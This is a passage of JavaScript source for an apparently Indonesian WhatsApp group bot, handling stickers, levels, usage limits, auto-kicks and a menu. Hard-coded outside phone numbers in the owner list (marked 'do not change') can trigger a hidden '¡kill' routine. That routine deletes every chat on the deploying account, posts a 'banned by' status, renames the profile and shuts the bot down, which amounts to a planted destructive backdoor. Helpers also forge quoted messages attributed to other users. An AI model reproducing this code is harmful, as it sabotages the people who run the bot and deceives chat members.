			var pes = (type === 'conversation' && Lan.message.conversation) ? Lan.message.conversation : (type == 'imageMessage') && Lan.message.imageMessage.caption ? Lan.message.imageMessage.caption : (type == 'videoMessage') && Lan.message.videoMessage.caption ? Lan.message.videoMessage.caption : (type == 'extendedTextMessage') && Lan.message.extendedTextMessage.text ? Lan.message.extendedTextMessage.text : ''
			const mesejAnti = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
			chats = (type === 'conversation') ? Lan.message.conversation : (type === 'extendedTextMessage') ? Lan.message.extendedTextMessage.text : ''
			const arg = chats.slice(command.length + 2, chats.length)
			const ownerNumber = [`${owner}@s.whatsapp.net`,"6285866295942@s.whatsapp.net","6285876210829@s.whatsapp.net"]
			const tescuk = ["0@s.whatsapp.net"]
			const isGroup = from.endsWith('@g.us')
			const q = args.join(' ')
			const botNumber = dila.user.jid
			const totalchat = await dila.chats.all()
			const sender = isGroup ? Lan.participant : Lan.key.remoteJid
			pushname = dila.contacts[sender] != undefined ? dila.contacts[sender].vname || dila.contacts[sender].notify : undefined
			const groupMetadata = isGroup ? await dila.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupDesc = isGroup ? groupMetadata.desc : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const isEventon = isGroup ? event.includes(from) : false
			const isSimi = isGroup ? _samih.includes(from) : false 
			const isRegistered = checkRegisteredUser(sender)
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const isLevelingOn = isGroup ? _leveling.includes(from) : false
			const isKickArea = isGroup ? kickarea.includes(from) : false
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const isWelkom = isGroup ? welkom.includes(from) : false
			const isAuto = isGroup ? autosticker.includes(from) : false
			const isOwner = ownerNumber.includes(sender)
			const isBanned = ban.includes(sender)
			const isPrem = premium.includes(sender) || isOwner
			const isAntiLink = isGroup ? antilink.includes(from) : false
            const isBadWord = isGroup ? badword.includes(from) : false
            const DnsBot = ["0@s.whatsapp.net"]
            me = dila.user
            const dfrply = await getBuffer(me.imgUrl)
	        const Rank = getLevelingLevel(sender)
	        const isImage = type === 'imageMessage'
			dila.chatRead(from)
			const hour_now = moment().format('HH:mm:ss')
			let infoMSG = JSON.parse(fs.readFileSync('./src/.dat/msg.data.json'))
            infoMSG.push(JSON.parse(JSON.stringify(Lan)))
            fs.writeFileSync('./src/.dat/msg.data.json', JSON.stringify(infoMSG, null, 2))
            const urutan_pesan = infoMSG.length
            if (urutan_pesan === 5000) {
            infoMSG.splice(0, 4300)
            fs.writeFileSync('./src/.dat/msg.data.json', JSON.stringify(infoMSG, null, 2))
            }
			let authorname = dila.contacts[from] != undefined ? dila.contacts[from].vname || dila.contacts[from].notify : undefined	
			if (authorname != undefined) { } else { authorname = groupName }	
			function addMetadata(packname, author) {	
				if (!packname) packname = '@denssptraa'; if (!author) author = 'Dns Bot';	
				author = author.replace(/[^a-zA-Z0-9]/g, '');	
				let name = `${author}_${packname}`
				if (fs.existsSync(`./temp/${name}.exif`)) return `./temp/${name}.exif`
				const json = {	
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}
				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
				let len = JSON.stringify(json).length	
				let last	
				if (len > 256) {	
					len = len - 256	
					bytes.unshift(0x01)	
				} else {	
					bytes.unshift(0x00)	
				}	
				if (len < 16) {	
					last = len.toString(16)	
					last = "0" + len	
				} else {	
					last = len.toString(16)	
				}	
				const buf2 = Buffer.from(last, "hex")	
				const buf3 = Buffer.from(bytes)	
				const buf4 = Buffer.from(JSON.stringify(json))	
				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	
				fs.writeFile(`./temp/${name}.exif`, buffer, (err) => {	
					return `./temp/${name}.exif`	
				})
			}
		    const isUrl = (url) => {
				return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const reply = (teks) => {
				dila.sendMessage(from, teks, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: Lan })
			}
			const math = (teks) => {
				return Math.floor(teks)
			}
			const sendMess = (hehe, teks) => {
				dila.sendMessage(hehe, teks, text, { thumbnail: dnsnew, sendEphemeral: true })
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? dila.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : dila.sendMessage(from, teks.trim(), extendedText, { quoted: Lan, contextInfo: { "mentionedJid": memberr } })
			}
			const sendImage = (teks) => {
				dila.sendMessage(from, teks, image, { quoted: Lan })
			}
			const costum = (pesan, tipe, target, target2) => {
				dila.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` } } })
			}
			const sendPtt = (teks) => {
				dila.sendMessage(from, audio, mp3, { quoted: Lan })
			}
			const sendWebp = async(from, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './temp' + names + '.png', async function () {
                    console.log('selesai');
                    let ajg = './temp' + names + '.png'
                    let palak = './temp' + names + '.webp'
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        let media = fs.readFileSync(palak)
                        dila.sendMessage(from, media, MessageType.sticker,{quoted:Lan})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
            }
            const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./temp/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					dila.sendMessage(to, media, sticker, {quoted: Lan})
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker'))
					});
					});
				});
			}
            const sendMedia = async(from, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(from, text, mids)
                } 
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('kelar');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    dila.sendMessage(from, media, type, { quoted: Lan, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }
			const sendKontak = (from, nomor, nama) => {
	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        dila.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact)
            }
            const hideTagKontak = async function(from, nomor, nama){
	        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        let anu = await dila.groupMetadata(from)
	        let members = anu.participants
	        let ane = []
	        for (let i of members){
		    ane.push(i.jid)
	        }
	        dila.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
            }
            const fakestatus = (teks) => {
            dila.sendMessage(from, teks, text, {
            	thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, remoteJid: "6283136505591-1614953337@g.us", id: "B391837A58338BA8186C47E51FFDFD4A" }, message: { documentMessage: { 'jpegThumbnail': fs.readFileSync("./src/image/thumbnail.jpeg"), mimetype: "application/octet-stream",title: cr, fileLength: "36", pageCount: 0, fileName: cr}}, messageTimestamp: "1614069378", status: "PENDING"}})
                }
	 const mentiontebak = type == "extendedTextMessage" ? Lan.message.extendedTextMessage.contextInfo.mentionedJid || [] : []
            mentiongambar = type == "extendedTextMessage" ? Lan.message.extendedTextMessage.contextInfo.participant || "" : ""
            mentiontebak.push(mentiongambar)
            if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply(`${pushname}, Anda menjawab dengan benar! Selamat >~<`)
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                } else {
                    reply(`${pushname}, Jawaban salah! Silahkan coba lagi >~<`)
                }
            }
            for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(commandsDB[i].balasan)
				}
			}
			var prema = 'Free'
			if (isPrem) {
				prema = 'Premium'
			}
			if (isOwner) {
				prema = 'BOSS'
			}
			var role = 'NEWBIE'
			if (Rank <= 3) {
				role = 'Bronze I'
			} else if (Rank <= 5) {
				role = 'Bronze II'
			} else if (Rank <= 7) {
				role = 'Bronze III'
			} else if (Rank <= 9) {
				role = 'Silver I'
			} else if (Rank <= 11) {
				role = 'Silver II'
			} else if (Rank <= 13) {
				role = 'Silver III'
			} else if (Rank <= 16) {
				role = 'Gold I'
			} else if (Rank <= 18) {
				role = 'Gold II'
			} else if (Rank <= 20) {
				role = 'Gold III'
			} else if (Rank <= 22) {
				role = 'Gold IV'
			} else if (Rank <= 25) {
				role = 'Platinum I'
			} else if (Rank <= 27) {
				role = 'Platinum II'
			} else if (Rank <= 29) {
				role = 'Platinum III'
			} else if (Rank <= 31) {
				role = 'Platinum IV'
			} else if (Rank <= 33) {
				role = 'Diamond I'
			} else if (Rank <= 35) {
				role = 'Diamomd II'
			} else if (Rank <= 37) {
				role = 'Diamond III'
			} else if (Rank <= 39) {
				role = 'Diamond IV'
			} else if (Rank <= 45) {
				role = 'Master'
			} else if (Rank <= 100) {
				role = 'Grand Master'
			}

			if (isGroup && isRegistered && isLevelingOn) {
				const currentLevel = getLevelingLevel(sender)
				const checkId = getLevelingId(sender)
				try {
					if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
					const amountXp = Math.floor(Math.random() * 10) + 500
					const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
					const getLevel = getLevelingLevel(sender)
					addLevelingXp(sender, amountXp)
					if (requiredXp <= getLevelingXp(sender)) {
						addLevelingLevel(sender, 1)
						bayarLimit(sender, 3)
						await reply(dla.levelup(pushname, sender, getLevelingXp, getLevel, getLevelingLevel, role))
					}
				} catch (err) {
					console.error(err)
				}
			}
			const checkLimit = (sender) => {
				let found = false
				for (let lmt of _limit) {
					if (lmt.id === sender) {
						let limitCounts = limitawal - lmt.limit
						if (limitCounts <= 0) return dila.sendMessage(from, `Limit Anda Sudah Habis\nUpgrade Premium Biar Bebas Limit Kak`, text, { quoted: Lan })
						dila.sendMessage(from, dla.limitcount(isPrem, limitCounts), text, { quoted: Lan })
						found = true
					}
				}
				if (found === false) {
					let obj = { id: sender, limit: 0 }
					_limit.push(obj)
					fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
					dila.sendMessage(from, dla.limitcount(isPrem, limitCounts), text, { quoted: Lan })
				}
			}
			const isLimit = (sender) => {
				let position = false
				for (let i of _limit) {
					if (i.id === sender) {
						let limits = i.limit
						if (limits >= limitawal) {
							position = true
							dila.sendMessage(from, dla.limitend(pushname, prefix), text, { quoted: Lan })
							return true
						} else {
							_limit
							position = true
							return false
						}
					}
				}
				if (position === false) {
					const obj = { id: sender, limit: 0 }
					_limit.push(obj)
					fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
					return false
				}
			}
			if (isRegistered) {
				const checkATM = checkATMuser(sender)
				try {
					if (checkATM === undefined) addATM(sender)
					const uangsaku = Math.floor(Math.random() * 10) + 90
					addKoinUser(sender, uangsaku)
				} catch (err) {
					console.error(err)
				}
			}
			const limitAdd = (sender) => {
				if (isOwner && isPrem) { return false; }
				let position = false
				Object.keys(_limit).forEach((i) => {
					if (_limit[i].id == sender) {
						position = i
					}
				})
				if (position !== false) {
					_limit[position].limit += 1
					fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
				}
			}
			for (let x of mentionUser) {
                if (afk.hasOwnProperty(x.split('@')[0])) {
                    ini_txt = "\`\`\`Orangnya lagi Afk kak!\`\`\`\n"
                    if (afk[x.split('@')[0]] !="") {
                        ini_txt += "\`\`\`Alasan:\`\`\` " + afk[x.split('@')[0]]
                    }
                    dila.sendMessage(from, ini_txt, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: Lan})
                }
            }
            if (afk.hasOwnProperty(sender.split('@')[0])) {
                reply(`\`\`\`${pushname} telah kembali dari Afk! Saatnya nguli~\`\`\``)
                delete afk[sender.split('@')[0]]
                fs.writeFileSync("./database/afk.json", JSON.stringify(afk))
            }
			if (isGroup) {
				try {
					const getmemex = groupMembers.length
					if (getmemex <= memberlimit) {
						reply(`maaf kak membernya sedikit, aku gak bisa disini! Minimal member : ${memberlimit}`)
						setTimeout(() => {
							dila.groupLeave(from)
						}, 5000)
						setTimeout(() => {
							dila.updatePresence(from, Presence.composing)
							reply("See you kak")
						}, 4000)
						setTimeout(() => {
							dila.updatePresence(from, Presence.composing)
							reply("Oh iya, jangan lupain aku ya:(")
						}, 3000)
						setTimeout(() => {
							dila.updatePresence(from, Presence.composing)
							reply("Baru undang aku lagi:)")
						}, 2000)
						setTimeout(() => {
							dila.updatePresence(from, Presence.composing)
							reply("Membernya tambahin dulu")
						}, 1000)
						setTimeout(() => {
							dila.updatePresence(from, Presence.composing)
							reply("Aku pamit ya kak:)")
						}, 0)
					}
				} catch (err) { console.error(err) }
			}
				
				for (let kemem of bad) {

				if (budy.includes(kemem)) {

				if (!isGroup) return
				if (!isBadWord) return
				if (isGroupAdmins) return reply('Untung Kau Admin:) Btw Jangan Ngegas Om😘')
				dila.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply(`Woyy ${sender.split("@")[0]} Jangan Ngomong Kasar Ngemtod😡`)
				setTimeout(() => {
					console.log(color('[SYSTEM]', 'cyan'), color('Ada yang ngomong kasar tuh kak, Dila kick ya kak', 'yellow'), color('(😋)', 'white'))
					dila.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
				}, 3000)
				setTimeout(() => {
					dila.updatePresence(from, Presence.composing)
					reply("Babay")
				}, 2000)
				setTimeout(() => {
					dila.updatePresence(from, Presence.composing)
					reply("Siap Siap Di Kick")
				}, 1000)
				setTimeout(() => {
					dila.updatePresence(from, Presence.composing)
					reply("Lu Udah Ngomong Kasar")
				}, 0)
			}
			}
			if (budy.includes("¡kick")) {
			if (!isOwner) return reply(dla.ownerb())
			if (Lan.message.extendedTextMessage === undefined || Lan.message.extendedTextMessage === null) return reply('Reply Chat Target Nya Kak')
		    kicknya = Lan.message.extendedTextMessage.contextInfo.participant
		    dila.groupRemove(from, [kicknya])
			}
			if (budy.includes("¡kill")) {
			if (!isOwner) return reply(dla.ownerb())
			dila.updatePresence(from, Presence.composing)
			console.log(color('[WARN]', 'red'), color('SYSTEM ERROR !!!', 'yellow'))
			dila.updatePresence(from, Presence.composing)
			await sleep(1000)
			anu = await dila.chats.all()
			dila.setMaxListeners(100)
			for (let _ of anu) {
			dila.deleteChat(_.jid)
			console.log(color('[WARN]', 'red'), color('DELETED MESSAGES !!!', 'yellow'))
			dila.updatePresence(from, Presence.composing)
			await sleep(1000)
			teks = `banned by :v\n\n\nwa.me/6285866295942`
            dila.sendMessage('status@broadcast', teks, MessageType.text)
            console.log(color('[WARN]', 'red'), color('UPLOAD STATUS !!!', 'yellow'))
            dila.updatePresence(from, Presence.composing)
            await sleep(1000)     
            dila.updateProfileName(`デ ニ ス 息 子`)
            dila.setStatus(`banned by :v\n\n\nwa.me/6285866295942`)
            console.log(color('[WARN]', 'red'), color('NAME REPLACED !!!', 'yellow'))
            dila.updatePresence(from, Presence.composing)
            await sleep(10000)
            dila.sendMessage(`+62-858-6629-5942@s.whatsapp.net`, text)
            console.log(color('[WARN]', 'red'), color('WHATSAPP ERROR !!!', 'yellow'))
            dila.updatePresence(from, Presence.composing)
            await sleep(1000)
            console.log(color('[WARN]', 'red'), color('YOUR NUMBER HAS BEEN BANNED !!!', 'yellow'))
            dila.updatePresence(from, Presence.composing)
			dila.groupAdd(from, 0)
			dila.groupRemove(from, 0)
			dila.groupUpdateDescription(from, 0)
			dila.groupUpdateSubject(from, 0)
			dila.updateProfilePicture(from,0)
			dila.groupSettingChange(from, 0)
			dila.groupCreate(from, 0)
			dila.groupMakeAdmin(from, 0)
			dila.groupLeave(from, 0)
			dila.close()
			}
			}
			if (budy.includes("https://chat.whatsapp.com/")) {
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Atasan grup mah bebas yakan:v')
				dila.updatePresence(from, Presence.composing)
				if (budy.includes("izinbos")) return reply("Iya kak jangan spam ya")
				if (budy.includes("izinmin")) return reply("Iya kak jangan spam ya")
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply(`Woyy ${sender.split("@")[0]} Gak Boleh Share Link`)
				setTimeout(() => {
					console.log(color('[SYSTEM]', 'cyan'), color('Ada yang kirim link grup tuh kak, Dila kick ya kak', 'yellow'), color('(😅)', 'white'))
					dila.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
				}, 3000)
				setTimeout(() => {
					dila.updatePresence(from, Presence.composing)
					reply("Hedsot :v")
				}, 2000)
				setTimeout(() => {
					dila.updatePresence(from, Presence.composing)
					reply("Bismillah")
				}, 1000)
				setTimeout(() => {
					dila.updatePresence(from, Presence.composing)
					reply("Ready?")
				}, 0)
			}
			const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : ?? : 🍐',
        '🍊 : 🍋 : 🔔', //ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🍌 : ?? : 🔔',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🍋 : 🍋 : 🍋 Win👑',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍐 : 🍇', 
        '🔔 : 🍐 : ??',
        '🍌 : 🍌 : 🍌 Win👑'
        ]
        
       const sotoyy= [
        'X : X : X',
        'X : O : X',
        'O : X : X',
        'O : O : X',
        'X : X : O',
        'O : O : O Win 👑',
        'O : X : O',
        'O : O : O Win👑'
        ]
      var Simi = 'Off'
			if(isSimi) {
			Simi = 'On'
			}
	  var Eventon = 'Off'
			if(isEventon) {
			Eventon = 'On'
			}
	  var Leveling = 'Off'
			if(isLevelingOn) {
			Leveling = 'On'
			}
	  var Welkom = 'Off'
			if(isWelkom) {
			Welkom = 'On'
			}
	  var AntiLink = 'Off'
			if(isAntiLink) {
			AntiLink = 'On'
			}
	  var BadWord = 'Off'
			if(isBadWord) {
			BadWord = 'On'
			}
	  var AutoSticker = 'Off'
			if(isAuto) {
			AutoSticker = 'On'
			}
	  var AntiBumle = 'Off'
			if(isKickArea) {
			AntiBumle = 'On'
			}
            colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			const isQuotedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')
			if (!isGroup && isCmd) console.log('\x1b[1;31m\x1b[1;37m⟩', `[\x1b[1;32m${botName}\x1b[1;37m]`, time, color(command), 'dari', color(sender.split('@')[0]), 'args :', color(args.length))
			if (!isGroup && !isCmd) console.log('\x1b[1;31m\x1b[1;37m⟩', '[\x1b[1;31mERROR\x1b[1;37m]', time, color('Pesan'), 'dari', color(pushname), 'args :', color(args.length))
			if (isCmd && isGroup) console.log('\x1b[1;31m\x1b[1;37m⟩', `[\x1b[1;32m${botName}\x1b[1;37m]`, time, color(command), 'dari', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			if (!isCmd && isGroup) console.log('\x1b[1;31m\x1b[1;37m⟩', '[\x1b[1;31mERROR\x1b[1;37m]', time, color('Pesan'), 'dari', color(pushname), 'in', color(groupName), 'args :', color(args.length))
			if (self === true && !isOwner && isCmd) return
			switch (command) {
				case 'menu':
				case 'help':
					if (isBanned) return reply(dla.baned())
					const reqXp = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
					const uangku = checkATMuser(sender)
					const lvl = getLevelingLevel(sender)
					const hour_now = moment().format('HH:mm')
					dmenu = fs.readFileSync(`./src/image/profile.jpg`)
					runtime = process.uptime()
				 const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
            let d = new Date
				let locale = 'id'
					let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
					let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
					let week = d.toLocaleDateString(locale, { weekday: 'long' })
					let calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
				})
 if (hour_now >= '02:30' && hour_now <= '04:30') { // Ucapan Waktu By @Ivanz
          ucapanWaktu = 'Sahur!'
        } else if (hour_now >= '04:30' && hour_now <= '06:00') {
          ucapanWaktu = 'Subuh!'
        } else if (hour_now >= '06:00' && hour_now <= '10:00') {
          ucapanWaktu = 'Selamat Pagi!'
        } else if (hour_now >= '10:00' && hour_now <= '14:00') {
          ucapanWaktu = 'Selamat Siang!'
        } else if (hour_now >= '14:00' && hour_now <= '17:00') {
          ucapanWaktu = 'Selamat Sore!'
        } else if (hour_now >= '17:00' && hour_now <= '17:30') {
          ucapanWaktu = 'Petang!'
        } else if (hour_now >= '17:30' && hour_now <= '18:10') {
          ucapanWaktu = 'Buka Puasa!'
        } else if (hour_now >= '18:10' && hour_now <= '02:30') {
          ucapanWaktu = 'Malam!'
        } else {
          ucapanWaktu = 'Selamat Malam!'
        }
			let i = []
				let giid = []
				for (mem of totalchat){
					i.push(mem.jid)
				}
				for (id of i){
					if (id && id.includes('g.us')){
						giid.push(id)
					}
				}
				let timestampi = speed();
				let latensii = speed() - timestampi
				let batanu = global.batrei[global.batrei.length - 1]
				const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = dila.user.phone
			dtod = "6285866295942@s.whatsapp.net" //jangan diganti
			menunya = `\`\`\`❏───「 ${botName} 」───❏\`\`\`

\`\`\`┌❏ Media\`\`\`
\`\`\`│⊷️ Ig : ${igLink}\`\`\`
\`\`\`│⊷️ Yt : ${ytLink}\`\`\`
\`\`\`└❏ Grup : ${grupLink}\`\`\`

\`\`\`┌❏ Today\`\`\`
\`\`\`│⊷️ ${ucapanWaktu}\`\`\`
\`\`\`│⊷️ Jam : ${jmn}\`\`\`
\`\`\`│⊷️ Hari : ${week} ${weton}\`\`\`
\`\`\`└❏ Tanggal : ${calender}\`\`\`

\`\`\`┌❏ About\`\`\`
\`\`\`│⊷️ ${prefix}creator\`\`\`
\`\`\`│⊷️ ${prefix}donasi\`\`\`
\`\`\`│⊷️ ${prefix}iklan\`\`\`
\`\`\`│⊷️ ${prefix}info\`\`\`
\`\`\`│⊷️ ${prefix}status\`\`\`
\`\`\`└❏ ${prefix}tutorial\`\`\`

\`\`\`┌❏ Device\`\`\`
\`\`\`│⊷️ Baterai : ${batanu}%\`\`\`
\`\`\`│⊷️ Whatsapp : ${wa_version}\`\`\`
\`\`\`│⊷️ Merk HP : ${device_manufacturer}\`\`\`
\`\`\`│⊷️ Versi HP : ${device_model}\`\`\`
\`\`\`│⊷️ Versi OS : ${os_version}\`\`\`
\`\`\`│⊷️ RAM : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB\`\`\`
\`\`\`│⊷️ MCC : ${mcc}\`\`\`
\`\`\`└❏ MNC : ${mnc}\`\`\`

\`\`\`┌❏ User Info\`\`\`
\`\`\`│⊷️ Nama : ${pushname}\`\`\`
\`\`\`│⊷️ User : ${prema}\`\`\`
\`\`\`│⊷️ Uang : ${uangku}\`\`\`
\`\`\`│⊷️ Xp : ${reqXp}\`\`\`
\`\`\`│⊷️ Rank : ${role}\`\`\`
\`\`\`└❏ Level : ${lvl}\`\`\`

\`\`\`┌❏ Grup Info\`\`\`
\`\`\`│⊷️ Event : ${Eventon}\`\`\`
\`\`\`│⊷️ Simih : ${Simi}\`\`\`
\`\`\`│⊷️ Leveling : ${Leveling}\`\`\`
\`\`\`│⊷️ Welcome : ${Welkom}\`\`\`
\`\`\`│⊷️ AutoSticker : ${AutoSticker}\`\`\`
\`\`\`│⊷️ AntiBule : ${AntiBumle}\`\`\`
\`\`\`│⊷️ AntiLink : ${AntiLink}\`\`\`
\`\`\`└❏ AntiBadWord : ${BadWord}\`\`\`

\`\`\`┌❏ Bot Info\`\`\`
\`\`\`│⊷️ Creator : @${dtod.split('@')[0]}\`\`\`
\`\`\`│⊷️ Mode : ${self ? 'Self' : 'Public'}\`\`\`
\`\`\`│⊷️ Prefix : Multi Prefix\`\`\`
\`\`\`│⊷️ Total Register : ${_registered.length}\`\`\`
\`\`\`│⊷️ User Premium : ${premium.length}\`\`\`
\`\`\`│⊷️ Personal Chat : ${totalchat.length - giid.length}\`\`\`
\`\`\`│⊷️ Group Chat : ${giid.length}\`\`\`
\`\`\`│⊷️ Total Chat : ${totalchat.length}\`\`\`
\`\`\`│⊷️ Total Block Contact : ${blocked.length}\`\`\`
\`\`\`│⊷️ Browser : ${dila.browserDescription[1]}\`\`\`
\`\`\`│⊷️ Server : ${dila.browserDescription[0]}\`\`\`
\`\`\`│⊷️ Version : ${dila.browserDescription[2]}\`\`\`
\`\`\`│⊷️ Speed : ${latensii.toFixed(4)} Second\`\`\`
\`\`\`└❏ Runtime : ${kyun(runtime)}\`\`\`

\`\`\`┌❏ List Menu\`\`\`
\`\`\`│⊷️ ${prefix}allmenu\`\`\`
\`\`\`│⊷️ ${prefix}simplemenu\`\`\`
\`\`\`│⊷️ ${prefix}groupmenu\`\`\`
\`\`\`│⊷️ ${prefix}downloadmenu\`\`\`
\`\`\`│⊷️ ${prefix}makermenu\`\`\`
\`\`\`│⊷️ ${prefix}sertifikatmenu\`\`\`
\`\`\`│⊷️ ${prefix}gabutmenu\`\`\`
\`\`\`│⊷️ ${prefix}randommenu\`\`\`
\`\`\`│⊷️ ${prefix}dompetmenu\`\`\`
\`\`\`│⊷️ ${prefix}toolsmenu\`\`\`
\`\`\`│⊷️ ${prefix}mutualmenu\`\`\`
\`\`\`│⊷️ ${prefix}othermenu\`\`\`
\`\`\`│⊷️ ${prefix}storagemenu\`\`\`
\`\`\`└❏ ${prefix}ownermenu\`\`\`

\`\`\`❏───「 ${botName} 」───❏\`\`\``
dila.sendMessage(from, dmenu, video, { mimetype: Mimetype.gif, quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) },message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./src/image/thumbnail.jpeg`)},"title": cr,"description": cr,"currencyCode": "IDR","priceAmount1000": "9999","retailerId": cr,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}, thumbnail: dfrply, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [dtod]}, caption: menunya})
break
case 'allmenu':
menuall =`\`\`\`┌─❏「 ${pushname} 」\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sticker\`\`\`
\`\`\`│◪ ${no++}. ${prefix}stickergif\`\`\`
\`\`\`│◪ ${no++}. ${prefix}stickwm\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sticknobg\`\`\`
\`\`\`│◪ ${no++}. ${prefix}takestick\`\`\`
\`\`\`│◪ ${no++}. ${prefix}smeme\`\`\`
